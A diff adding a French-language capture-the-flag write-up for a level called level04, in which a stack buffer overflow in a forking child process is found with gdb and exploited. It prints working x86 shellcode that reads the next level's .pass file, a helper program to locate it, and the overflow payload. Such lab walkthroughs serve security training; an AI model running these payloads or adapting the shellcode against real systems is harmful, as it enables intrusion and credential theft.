@@ -1,0 +1,21 @@
+Ce programme demande du shellcode mais ne fait rien avec. Cependant, le programme
+n'est pas du tout proteger contre un buffer overflow. Etant donne qu'il fait un
+fork, et que le pere ne s'occupe que de superviser son fils (eviter que quelconque
+execve soit effectuer), cest le fils qui va ecouter l'entree standard et cest lui
+que lon va overflow. Cependant notre shell ne nous montre pas le segfault des processus
+fils, il va donc falloir gdb pour le remarquer grace a:
+gdb: set follow-fork-mode child
+On remarque le segfault au 157eme charactere, et on va donc pouvoir rediriger
+notre programme fils.
+
+Construction de l'exploit: (le shellcode que nous utiliserons nous lis le .pass sans faire de execve)
+
+export EXPLOIT=`python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"'`
+
+echo 'int main(){printf("%p\n", getenv("EXPLOIT"));}' > /tmp/prog.c
+gcc -m32 -o /tmp/prog /tmp/prog.c ; /tmp/prog    
+
+//ceci nous donne une addresse sur laquelle on redirigera notre programme. Pour l'exemple, on prendra 0xffffd860
+
+payload:
+python -c 'print "A"*156 + "\x60\xd8\xff\xff"' | ./level04
